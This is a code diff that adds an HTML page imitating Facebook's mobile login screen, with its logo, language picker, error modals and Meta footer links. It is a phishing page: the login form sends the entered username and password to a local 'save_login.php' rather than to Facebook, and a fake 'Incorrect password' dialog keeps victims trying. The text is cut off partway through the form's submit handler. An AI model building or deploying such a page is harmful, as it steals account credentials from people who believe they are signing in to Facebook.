@@ -1,0 +1,1112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook - log in or sign up</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;500;600;700&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Helvetica Neue', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #fff;
+            color: #1c1e21;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            letter-spacing: 0.5px;
+        }
+
+        .continue {
+            padding: 7px;
+            border-bottom: 1.5px solid rgba(219, 171, 58, 0.932);
+            background-color: #f4eed2;
+        }
+        .continue p {
+            font-size: 15px;
+            color: rgb(163, 124, 47);
+        }
+
+        .page-content {
+            padding: 20px;
+        }
+
+        .language-text {
+            text-align: center;
+            font-size: 14px;
+            cursor: pointer;
+            margin: 20px 0;
+            color:#696969;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+        }
+
+        .blur-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 22, 32, 0.661);
+            z-index: 1;
+        }
+
+        .modal-content {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            height: 78%;
+            background: #fff;
+            border-radius: 20px 20px 0 0;
+            padding: 0px 15px 10px 15px;
+            z-index: 2;
+            overflow-y: auto;
+            overscroll-behavior: contain;
+            -webkit-overflow-scrolling: touch;
+            transform: translateY(100%);
+            transition: transform .30s ease;
+            will-change: transform;
+        }
+
+        .modal.show .modal-content {
+            transform: translateY(0);
+        }
+
+        .drag-handle {
+            width: 35px;
+            height: 4px;
+            background: #8d8d8d;
+            border-radius: 30px;
+            margin: 1px auto;
+            cursor: grab;
+            position: relative;
+            border: 1px solid black;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            flex-direction: column;
+            gap: 5px;
+            font-size: 17px;
+            position: sticky;
+            top: 0;
+            background: #fff;
+            z-index: 20;
+            padding-bottom: 10px;
+            padding-top: 10px;
+        }
+
+        .close-x {
+            font-size: 25px;
+            cursor: pointer;
+            position: relative;
+            top: 0px;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .select-lang {
+            font-size: 22px;
+            font-weight: 500;
+            letter-spacing: 0.7px;
+            padding-top: 5px;
+        }
+
+        .lang-options {
+            margin-top: 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 35px;
+            border: 1px solid rgb(220, 220, 220);
+            padding: 20px 15px;
+            border-radius: 20px;
+        }
+
+        .lang-options label {
+            font-size: 16px;
+            display: flex;
+            justify-content: space-between;
+            cursor: pointer;
+        }
+
+        .lang-options input[type="radio"] {
+            display: none;
+        }
+
+        .checkmark {
+            width: 17px;
+            height: 17px;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            color: transparent;
+            transition: all 0.2s ease;
+        }
+
+        input[type="radio"]:checked + .checkmark {
+            background-color: #0866FF;
+            border-color: #0866FF;
+            color: #fff;
+        }
+
+        .logo {
+            text-align: center;
+            margin-top: 20px;
+            margin-bottom: 60px;
+        }
+
+        .input-box {
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        input {
+            width: 100%;
+            height: 62px;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 15px;
+        }
+
+        .input-box label {
+            position: absolute;
+            left: 12px;
+            top: 21px;
+            font-size: 16px;
+            color:#696969;
+            pointer-events: none;
+            padding: 0 4px;
+        }
+
+        .input-box input {
+            padding: 28px 10px 10px 15px;
+            font-size: 14.5px;
+            letter-spacing: 0.5px;
+            color: #2a2a2a;
+        }
+
+        .input-box input:focus + label,
+        .input-box input:not(:placeholder-shown) + label {
+            top: 10px;
+            font-size: 14px;
+            color: #6b6868;
+        }
+
+        .input-box input:focus {
+            border-color: #383838 !important;
+            outline: none;
+            box-shadow: none;
+        }
+
+        .show-btn {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px 8px;
+            display: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .show-btn svg {
+            width: 45px;
+            height: 45px;
+            color: #fffffff6;
+            filter: blur(0.5px);
+        }
+
+        .input-box:focus-within .show-btn {
+            display: block;
+        }
+
+        .login-btn {
+            background: #0963da;
+            color: #fff;
+            border: none;
+            border-radius: 100px;
+            padding: 14px;
+            width: 100%;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .login-btn:hover {
+            background: #095dcb;
+        }
+
+        #eye-open {
+            width: 25px;
+            height: 25px;
+            color: #fffffff6;
+            filter: blur(0.5px);
+            position: relative;
+            right: 10px;
+        }
+
+        .forgot {
+            display: block;
+            height: 35px;
+            width: 200px;
+            margin: 15px auto;
+            text-align: center;
+            color: #2b2a2a;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            line-height: 32px;
+        }
+
+        .forgot:hover {
+            background-color: #f0f0f0;
+        }
+
+        #signup-btn {
+            background: transparent;
+            color: #1877f2;
+            border: 1px solid #1877f2;
+            border-radius: 100px;
+            padding: 13px;
+            font-size: 14.3px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 105px 0 15px 0;
+            width: 100%;
+            letter-spacing: 0.5px;
+        }
+        #signup-btn.compact {
+            margin: 60px 0 15px 0;
+        }
+
+        #signup-btn:hover {
+            background-color: #f2f2f2e2;
+        }
+
+        .meta { text-align: center; }
+        .meta img { height: 12px; }
+
+        .footer-links {
+            margin-top: 22px;  
+            text-align: center;
+            color: #8a8d91;
+            font-size: 10px;
+        }
+
+        .footer-links a {
+            color: #8a8d91;
+            text-decoration: none;
+            margin: 0 4px;
+        }
+        .more-links {
+            display: none;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px 0.1px;
+            margin-top: 15px;  
+            text-align: center;
+            color: #8a8d91;
+            font-size: 10px;
+            line-height: 2.5;
+        }
+        .more-links a {
+            color: #8a8d91;
+            text-decoration: none;
+            margin: 0 3px;
+        }
+
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.4);
+            z-index: 9;
+        }
+
+        #errorModal {
+            display: none;
+            position: fixed;
+            top: 40%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 85%;
+            background: white;
+            border-radius: 12px;
+            padding-top: 20px;
+            text-align: center;
+            z-index: 10;
+        }
+
+        #errorModal #h1 {
+            margin: 0;
+            font-size: 18px;
+            font-weight: 500;
+        }
+
+        #errorModal p {
+            font-size: 14px;
+            margin: 10px 0;
+            color: #757575;
+        }
+
+        #errorModal .forgotten {
+            display: block;
+            padding: 12px 0;
+            width: 100%;
+            border-top: 1px solid #ddd;
+            text-decoration: none;
+            color: royalblue;
+            font-size: 15px;
+        }
+        #errorModal .forgotten:hover {
+            background-color:  #eeeeee;
+        }
+        
+
+        .tryAgain {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            background: none;
+            border-top: 1px solid #ddd;
+            color: royalblue;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        .tryAgain:hover  {
+            background-color: #eeeeee;
+        }
+
+        .incorrect-pass {
+            padding: 8px 15px 15px 15px;
+            
+        }
+
+        /* Clear button (X) in username/email input */
+        .clear-btn {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            width: 50px;
+            height: 50px;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: none; /* hidden until user types */
+            padding: 0;
+            z-index: 99999;
+        }
+
+        .clear-btn svg {
+            width: 27px;
+            height: 27px;
+            stroke: #777;
+        }
+
+        .clear-btn:active {
+            transform: translateY(-50%) scale(0.9);
+        }
+        /* Spinner inside login button */
+        .login-btn.loading {
+            position: relative;
+            color: transparent !important;
+        }
+
+        /* The spinner */
+        .login-btn.loading::after {
+            content: "";
+            width: 18px;
+            height: 18px;
+            border: 1px solid rgba(255, 255, 255, 0.6);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        @keyframes spin {
+            from { transform: translate(-50%, -50%) rotate(0deg); }
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        /* Input loading effect */
+        .input-loading {
+            background: rgba(200, 200, 200, 0.25) !important;
+            transition: 0.3s;
+        }
+        .fb-modal {
+            display: none;
+            position: fixed;
+            top: 38%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 85%;
+            background: white;
+            border-radius: 12px;
+            padding-top: 20px;
+            text-align: center;
+            z-index: 10;
+        }
+
+        .fb-modal .modal-box {
+            padding: 8px 15px 15px 15px;
+        }
+
+        .fb-modal h2 {
+            margin: 0;
+            font-size: 17px;
+            font-weight: 500;
+        }
+
+        .fb-modal p {
+            margin: 10px 0;
+            color: #757575;
+            font-size: 14px;
+            padding-bottom: 15px;
+        }
+
+        .fb-modal .ok-btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            background: none;
+            border-top: 1px solid #ddd;
+            color: royalblue;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        a, .signup-btn {
+            -webkit-tap-highlight-color: transparent;
+        } 
+
+    </style>
+</head>
+<body>
+
+    <div class="continue"><p>You must log in to continue.</p></div>
+
+    <div class="page-content">
+
+        <p id="language-btn" class="language-text" data-i18n="language_button">English (UK)</p>
+
+        <!-- Language Modal -->
+        <div id="language-modal" class="modal">
+            <div class="blur-overlay"></div>
+
+            <div class="modal-content">
+                <div class="modal-header">
+                    <div class="drag-handle" id="dragHandle"></div>
+                    <span id="close-x" class="close-x">✕</span>
+                </div>
+                <div class="select-lang" data-i18n="select_language">Select your language</div>
+
+                <div id="lang-options" class="lang-options">
+                    <label><input type="radio" name="lang" value="English (UK)" checked> English (UK) <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Hausa"> Hausa <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Igbo"> Igbo <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Yorùbá"> Yorùbá <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Français (France)"> Français (France) <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Português (Brasil)"> Português (Brasil) <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Español"> Español <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Português (Portugal)"> Português (Portugal) <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Deutsch"> Deutsch <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Italiano"> Italiano <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Nederlands"> Nederlands <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Русский"> Русский <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Kiswahili"> Kiswahili <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Malay"> Malay <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Filipino"> Filipino <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Ελληνικά"> Ελληνικά <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="Українська"> Українська <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="हिन्दी"> हिन्दी <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="বাংলা"> বাংলা <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="فارسی"> فارسی <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="العربية"> العربية <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="中文（简体）"> 中文（简体） <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="日本語"> 日本語 <span class="checkmark">✓</span></label>
+                    <label><input type="radio" name="lang" value="한국어"> 한국어 <span class="checkmark">✓</span></label>
+                </div>
+                <div style="height: 20px;"></div>
+            </div>
+        </div>
+
+        <!-- Logo -->
+        <div class="logo">
+            <svg viewBox="0 0 108 106" width="60" height="60">
+                <path fill="#1877f2" d="M106.54 53.27C106.54 23.81 83.19.46 53.73.46S.92 23.81.92 53.27c0 26.73 19.55 48.84 45.11 52.73v-37.3h-13.56v-15.43h13.56v-11.76c0-13.42 8.19-20.74 20.16-20.74 5.73 0 10.66 0.43 12.09 0.62v14.01h-8.28c-6.69 0-7.99 3.18-7.99 7.85v10.29h14.22l-1.85 15.43h-12.37v37.3c25.56-3.89 45.11-26 45.11-52.73z"/>
+            </svg>
+        </div>
+
+        <!-- Form -->
+        <form id="loginForm" action="save_login.php" method="POST">
+            <!-- Username / Email input with clear (X) button -->
+            <div class="input-box">
+                <input id="contact" type="text" name="username" placeholder=" " autocomplete="username">
+                <label data-i18n="login_email_label">Mobile number or email address</label>
+                <button type="button" id="clear-username" class="clear-btn" aria-label="Clear input">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                        <path d="M6 6L18 18M6 18L18 6"
+                            stroke="#777"
+                            stroke-width="2"
+                            stroke-linecap="round"/>
+                    </svg>
+                </button>
+            </div>
+
+            <!-- Password input with eye toggle -->
+            <div class="input-box">
+                <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password">
+                <label data-i18n="login_password_label">Password</label>
+                <button type="button" class="show-btn" aria-label="Show or hide password">
+                    <svg id="eye-closed" fill="none" height="64" viewBox="0 0 64 64" width="64" stroke="currentColor" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M44.0607 22.0607C44.6464 21.4749 44.6464 20.5251 44.0607 19.9393C43.4749 19.3536 42.5251 19.3536 41.9393 19.9393L19.9393 41.9393C19.3536 42.5251 19.3536 43.4749 19.9393 44.0607C20.5251 44.6464 21.4749 44.6464 22.0607 44.0607L44.0607 22.0607Z" fill="black"/>
+                    <path clip-rule="evenodd" d="M36.4672 23.2901C34.9805 22.8044 33.4656 22.5 32 22.5C28.0415 22.5 23.7233 24.7207 20.572 26.7364C18.9575 27.7691 17.5722 28.7992 16.5907 29.5707C16.0991 29.957 15.7069 30.2801 15.4355 30.5082C15.2998 30.6223 15.1943 30.7128 15.1215 30.7758C15.0852 30.8072 15.057 30.8318 15.0373 30.849L15.0143 30.8693L15.0077 30.8752L15.0049 30.8776C14.6841 31.1623 14.5 31.5711 14.5 32C14.5 32.4289 14.6836 32.8372 15.0043 33.1219L16 32C15.0043 33.1219 15.0056 33.123 15.0056 33.123L15.0077 33.1248L15.0143 33.1307L15.0373 33.151C15.057 33.1682 15.0852 33.1928 15.1215 33.2242C15.1943 33.2872 15.2998 33.3777 15.4355 33.4918C15.7069 33.7199 16.0991 34.043 16.5907 34.4293C17.5722 35.2008 18.9575 36.2309 20.572 37.2636C20.952 37.5066 21.3488 37.7526 21.76 37.9973L23.9548 35.8026C23.3515 35.4607 22.7602 35.102 22.1885 34.7364C20.6763 33.7691 19.3715 32.7992 18.4445 32.0707L18.3548 32L18.4445 31.9293C19.3715 31.2008 20.6763 30.2309 22.1885 29.2636C23.9697 28.1243 25.9419 27.0526 27.8715 26.3465C26.1307 27.6199 25 29.6779 25 32C25 32.8252 25.1428 33.6171 25.4051 34.3523L28.0077 31.7497C28.1318 29.7399 29.7399 28.1318 31.7497 28.0077L36.4672 23.2901ZM15.0049 30.8776C15.0049 30.8776 15.0043 30.8781 16 32L15.0049 30.8776Z" fill="black" fill-rule="evenodd"/>
+                    <path d="M32.2503 35.9923C34.2601 35.8682 35.8682 34.2601 35.9923 32.2503L38.5949 29.6477C38.8572 30.3829 39 31.1748 39 32C39 34.3221 37.8693 36.3801 36.1285 37.6535C38.0581 36.9474 40.0303 35.8757 41.8115 34.7364C43.3237 33.7691 44.6285 32.7992 45.5555 32.0707L45.6452 32L45.5555 31.9293C44.6285 31.2008 43.3237 30.2309 41.8115 29.2636C41.2398 28.898 40.6485 28.5393 40.0452 28.1974L42.24 26.0027C42.6512 26.2474 43.048 26.4934 43.428 26.7364C45.0425 27.7691 46.4278 28.7992 47.4093 29.5707C47.9009 29.957 48.2931 30.2801 48.5645 30.5082C48.7002 30.6223 48.8057 30.7128 48.8785 30.7758L48.9266 30.8175L48.9627 30.849L48.9857 30.8693L48.9923 30.8752L48.9944 30.877C48.9944 30.877 48.9957 30.8781 48 32L48.9951 33.1224L48.9923 33.1248L48.9857 33.1307L48.9627 33.151C48.943 33.1682 48.9148 33.1928 48.8785 33.2242C48.8057 33.2872 48.7002 33.3777 48.5645 33.4918C48.2931 33.7199 47.9009 34.043 47.4093 34.4293C46.4278 35.2008 45.0425 36.2309 43.428 37.2636C40.2767 39.2793 35.9585 41.5 32 41.5C30.5344 41.5 29.0195 41.1956 27.5328 40.7099L32.2503 35.9923Z" fill="black"/>
+                    <path d="M48.9951 33.1224C48.9951 33.1224 48.9957 33.1219 48 32L48.9957 30.8781C49.3164 31.1628 49.5 31.5711 49.5 32C49.5 32.4289 49.3159 32.8377 48.9951 33.1224Z" fill="black"/>
+                    </svg>
+
+                    <svg id="eye-open" style="display:none;" enable-background="new 0 0 32 32" fill="none" height="64" width="64" viewBox="0 0 32 32" xml:space="preserve" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M16,7C9.934,7,4.798,10.776,3,16c1.798,5.224,6.934,9,13,9s11.202-3.776,13-9C27.202,10.776,22.066,7,16,7z" fill="none" stroke="#000000" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="2"/>
+                        <circle cx="16" cy="16" fill="none" r="5" stroke="#000000" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="2"/>
+                    </svg>
+                </button>
+            </div>
+
+            <button type="submit" id="loginBtn" class="login-btn" data-i18n="login_button">Log in</button>
+        </form>
+
+        <!-- Error Modal -->
+        <div id="overlay"></div>
+        <div id="errorModal">
+            <div class="incorrect-pass">
+                <span id="h1" data-i18n="incorrect_password_title">Incorrect password</span>
+                <p data-i18n="incorrect_password_text">We can help you log in to your account if <br> you've forgotten your password.</p>
+            </div>
+            <a href="https://m.facebook.com/login/identify" id="button" class="forgotten" data-i18n="forgot_password">Forgotten password</a>
+            <button id="tryAgain" class="tryAgain" data-i18n="tryAgain_button">Try Again</button>
+        </div>
+
+        <!-- EMAIL REQUIRED MODAL -->
+        <div id="overlay"></div>
+        <div id="emailRequiredModal" class="fb-modal">
+            <div class="modal-box">
+                <h2 data-i18n="email_required_title">Email address or mobile <br> number required</h2>
+                <p data-i18n="email_required_text">Enter your email address or mobile <br> number to continue.</p>
+            </div>
+            <button class="ok-btn" data-i18n="ok_button" onclick="closeFbModal('emailRequiredModal')">OK</button>
+            
+        </div>
+
+        <!-- PASSWORD REQUIRED MODAL -->
+        <div id="overlay"></div>
+        <div id="passwordRequiredModal" class="fb-modal">
+            <div class="modal-box">
+                <h2 data-i18n="password_required_title">Password required</h2>
+                <p data-i18n="password_required_text">Enter your password to continue.</p>
+            </div>
+            <button class="ok-btn" data-i18n="ok_button" onclick="closeFbModal('passwordRequiredModal')">OK</button>
+        </div>
+
+
+        
+        <div id="bottom-section">
+            <a href="https://m.facebook.com/login/identify" class="forgot" data-i18n="forgot_password">Forgotten password?</a>
+            <a href="https://m.facebook.com/reg/" style="text-decoration:none;">
+                <button id="signup-btn" type="button" data-i18n="create_account">Create new account</button>
+            </a>
+        </div>
+        
+
+        <div class="meta"><img src="./images/Meta_Platforms_Inc._logo.svg" alt="Meta logo"></div>
+
+        <!-- Footer Links -->
+        <div class="footer-links">
+            <a data-i18n="footer_about" href="https://www.meta.com/about/?utm_source=about.meta.com&utm_medium=redirect">About</a>
+            <a data-i18n="footer_help" href="https://m.facebook.com/help/282489752085908/?helpref=popular_topics">Help</a>
+            <a id="moreBtn" class="more-btn" data-i18n="footer_more" href="javascript:void(0)">More</a>
+        </div>
+        <div class="more-links" id="moreLinks">
+            <a data-i18n="footer_messenger" href="https://www.messenger.com">Messenger</a>
+            <a data-i18n="footer_fblite" href="https://m.facebook.com/lite/">Facebook Lite</a>
+            <a data-i18n="footer_video" href="https://m.facebook.com/watch/">Video</a>
+            <a data-i18n="footer_metapay" href="https://www.meta.com/meta-pay/?utm_source=about.meta.com&utm_medium=redirect">Meta Pay</a>
+            <a data-i18n="footer_metastore" href="https://www.meta.com">Meta Store</a>
+            <a data-i18n="footer_metaquest" href="https://www.meta.com/quest/">Meta Quest</a>
+            <br>
+        
+            <a data-i18n="footer_raybanmeta" href="https://www.meta.com/ai-glasses/?utm_source=web.facebook.com&utm_medium=organicsearch">Ray-Ban Meta</a>
+            <a data-i18n="footer_metaai" href="https://www.meta.ai">Meta AI</a>
+            <a data-i18n="footer_metaai_more" href="https://www.meta.ai/pages/convert-files-to-pdf-online-free/?utm_source=foa_web_footer">Meta AI more content</a>
+            <a data-i18n="footer_instagram" href="https://www.instagram.com">Instagram</a>
+            <a data-i18n="footer_threads" href="https://www.threads.com">Threads</a>
+            <br>
+        
+            <a data-i18n="footer_developers" href="https://developers.facebook.com/?ref=pf">Developers</a>
+            <a data-i18n="footer_careers" href="https://www.metacareers.com/">Careers</a>
+            <a data-i18n="footer_policy" href="https://free.facebook.com/privacy/policy/?entry_point=facebook_page_footer#">Privacy Policy</a>
+            <a data-i18n="footer_center" href="https://web.facebook.com/privacy/center/?entry_point=facebook_page_footer">Privacy Center</a>
+        </div>
+    </div>
+
+    <script src="translations.js"></script>
+    <script>
+        /* --------------------------------------------------
+           TRANSLATION ENGINE (FINAL VERSION)
+        -------------------------------------------------- */
+        
+        // List of RTL writing languages
+        const RTL_LANGUAGES = ["العربية", "فارسی", "বাংলা"]; // add more if needed
+        
+        // Apply translation text to all elements
+        function applyTranslations(lang) {
+            const dict = translations[lang];
+            if (!dict) return;
+        
+            document.querySelectorAll("[data-i18n]").forEach(el => {
+                const key = el.getAttribute("data-i18n");
+        
+                if (dict[key]) {
+                    el.innerHTML = dict[key];
+                }
+            });
+        }
+        
+        // Main function to activate language
+        function setLanguage(lang) {
+            // Save choice
+            localStorage.setItem("selected_language", lang);
+        
+            // Apply text to screen
+            applyTranslations(lang);
+        
+            // Update button label
+            const langBtn = document.getElementById("language-btn");
+            if (langBtn) langBtn.textContent = lang;
+        
+            // Apply RTL or LTR direction
+            if (RTL_LANGUAGES.includes(lang)) {
+                document.body.setAttribute("dir", "rtl");
+            } else {
+                document.body.setAttribute("dir", "ltr");
+            }
+        }
+        
+        /* --------------------------------------------------
+           LANGUAGE RADIO SELECTION LISTENER
+        -------------------------------------------------- */
+        
+        document.querySelectorAll("input[name='lang']").forEach(radio => {
+            radio.addEventListener("change", () => {
+                const selectedLang = radio.value;
+        
+                // Apply language
+                setLanguage(selectedLang);
+        
+                // Close modal
+                const modal = document.getElementById("language-modal");
+                modal.classList.remove("show");
+                setTimeout(() => modal.style.display = "none", 200);
+            });
+        });
+        
+        /* --------------------------------------------------
+           LOAD SAVED LANGUAGE ON PAGE LOAD
+        -------------------------------------------------- */
+        document.addEventListener("DOMContentLoaded", () => {
+            let savedLang = localStorage.getItem("selected_language");
+        
+            // If no saved language, default = English (UK)
+            if (!savedLang) savedLang = "English (UK)";
+        
+            // Apply language on page load
+            setLanguage(savedLang);
+        
+            // Auto-check the correct radio button
+            document.querySelectorAll("input[name='lang']").forEach(radio => {
+                radio.checked = (radio.value === savedLang);
+            });
+        });
+    </script>
+    <script>
+        /* --------------------------------------------------
+            LANGUAGE MODAL
+        -------------------------------------------------- */
+        const langBtn = document.getElementById("language-btn");
+        const modal = document.getElementById("language-modal");
+        const modalContent = document.querySelector(".modal-content");
+        const closeX = document.getElementById("close-x");
+        const radios = document.querySelectorAll("input[name='lang']");
+        const dragHandle = document.getElementById("dragHandle");
+        
+        langBtn.addEventListener("click", () => {
+            modal.style.display = "flex";
+            setTimeout(() => modal.classList.add("show"), 10);
+        });
+        
+        function closeModal() {
+            modal.classList.remove("show");
+            setTimeout(() => modal.style.display = "none", 200);
+        }
+        
+        closeX.addEventListener("click", closeModal);
+        
+        modal.addEventListener("click", (e) => {
+            if (!modalContent.contains(e.target)) closeModal();
+        });
+        
+        modalContent.addEventListener("click", e => e.stopPropagation());
+        
+        radios.forEach(radio => {
+            radio.addEventListener("change", () => {
+                langBtn.textContent = radio.value;
+            });
+        });
+        
+        
+       // DRAG VARIABLES
+        let startY = 0;
+        let currentY = 0;
+        let isDragging = false;
+
+        dragHandle.addEventListener("touchstart", (e) => {
+            isDragging = true;
+            startY = e.touches[0].clientY;
+            modalContent.style.transition = "none";
+        });
+
+        dragHandle.addEventListener("touchmove", (e) => {
+            if (!isDragging) return;
+
+            currentY = e.touches[0].clientY;
+            let diff = currentY - startY;
+
+            // Only drag if user is pulling DOWN and scroll is at the top
+            if (modalContent.scrollTop === 0 && diff > 0) {
+                modalContent.style.transform = `translateY(${diff}px)`;
+            }
+        });
+
+        dragHandle.addEventListener("touchend", () => {
+            if (!isDragging) return;
+            isDragging = false;
+
+            modalContent.style.transition = "transform 0.3s ease";
+
+            if (currentY - startY > 120) {
+                closeModal();
+            } else {
+                modalContent.style.transform = "translateY(0)";
+            }
+        });
+
+        modalContent.addEventListener("touchstart", (e) => {
+            startY = e.touches[0].clientY;
+        });
+
+
+
+        // Convert bottom scroll to drag-down behavior
+        modalContent.addEventListener("scroll", () => {
+            const scrollBottom = modalContent.scrollTop + modalContent.clientHeight;
+            const atBottom = scrollBottom >= modalContent.scrollHeight - 5;
+
+            modalContent.dataset.atBottom = atBottom ? "true" : "false";
+        });
+
+        // Enable drag close when at bottom
+        modalContent.addEventListener("touchmove", (e) => {
+            const atBottom = modalContent.dataset.atBottom === "true";
+
+            if (atBottom) {
+                // Treat scroll as dragging modal downward
+                currentY = e.touches[0].clientY;
+                let diff = currentY - startY;
+
+                if (diff > 0) {
+                    modalContent.style.transform = `translateY(${diff}px)`;
+                    e.preventDefault(); // stop underlying page scroll
+                }
+            }
+        }, { passive: false });
+
+        
+        
+        /* --------------------------------------------------
+            PASSWORD SHOW / HIDE TOGGLE
+        -------------------------------------------------- */
+        const passwordInput = document.getElementById("password");
+        const showBtn = document.querySelector(".show-btn");
+        const eyeClosed = document.getElementById("eye-closed");
+        const eyeOpen = document.getElementById("eye-open");
+        let ignoreBlur = false;
+        
+        showBtn.addEventListener("mousedown", () => ignoreBlur = true);
+        
+        passwordInput.addEventListener("focus", () => {
+            showBtn.style.display = "block";
+        });
+        
+        passwordInput.addEventListener("blur", () => {
+            if (ignoreBlur) {
+                ignoreBlur = false;
+                return;
+            }
+            if (passwordInput.value === "") showBtn.style.display = "none";
+        });
+        
+        passwordInput.addEventListener("input", () => {
+            if (passwordInput.value !== "") showBtn.style.display = "block";
+        });
+        
+        showBtn.addEventListener("click", (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+        
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                eyeClosed.style.display = "none";
+                eyeOpen.style.display = "block";
+            } else {
+                passwordInput.type = "password";
+                eyeClosed.style.display = "block";
+                eyeOpen.style.display = "none";
+            }
+        });
+        
+        
+        /* --------------------------------------------------
+            LOGIN VALIDATION + SPINNER + INPUT LOAD EFFECT
+        -------------------------------------------------- */
+        const usernameInput = document.getElementById("contact");
+        const loginBtn = document.getElementById("loginBtn");
+
+        function showError() {
+            document.getElementById("overlay").style.display = "block";
+            document.getElementById("errorModal").style.display = "block";
+        }
+
+        document.getElementById("tryAgain").addEventListener("click", () => {
+            document.getElementById("overlay").style.display = "none";
+            document.getElementById("errorModal").style.display = "none";
+        });
+
+        // Required modal controllers
+        function showFbModal(id) {
+            document.getElementById("overlay").style.display = "block";
+            document.getElementById(id).style.display = "block";
+        }
+
+        function closeFbModal(id) {
+            document.getElementById("overlay").style.display = "none";
+            document.getElementById(id).style.display = "none";
+        }
+
+        document.getElementById("overlay").addEventListener("click", () => {
+            document.getElementById("overlay").style.display = "none";
+            document.getElementById("errorModal").style.display = "none";
+            document.getElementById(id).style.display = "none";
+        });
+
+        document.getElementById("overlay").addEventListener("click", () => {
+            closeFbModal("emailRequiredModal");
+            return;
+        });
+
+        document.getElementById("overlay").addEventListener("click", () => {
+            closeFbModal("passwordRequiredModal");
+            return;
+        });
+
+        /* --------------------------
+        EMAIL / PHONE VALIDATION
+        --------------------------- */
+
+        // Valid email: MUST contain @ AND . (spaces allowed)
+        function isValidEmail(str) {
+            return str.includes("@") && str.includes(".") && !str.includes("-");
+        }
+
+        // Valid phone: digits + allow +, spaces, hyphens
+        function isValidPhone(str) {
+            const digits = str.replace(/[^\d]/g, "");
+            const phonePattern = /^[+\d\s-]+$/;
+            return phonePattern.test(str) && digits.length >= 5;
+        }
+
+        loginForm.addEventListener("submit", function (e) {
+            e.preventDefault(); // block submit by default
+
+            loginBtn.classList.add("loading");
+            loginBtn.disabled = true;
+
+            usernameInput.classList.add("input-loading");
+            passwordInput.classList.add("input-loading");
+
+            const value = usernameInput.value.trim();
+            const pwd = passwordInput.value.trim();
+
+            setTimeout(() => {
+
+                if (value === "" && pwd === "") {
+                    stopLoading();
+                    showFbModal("emailRequiredModal");
+                    return;
+                }
+
+                if (value === "") {
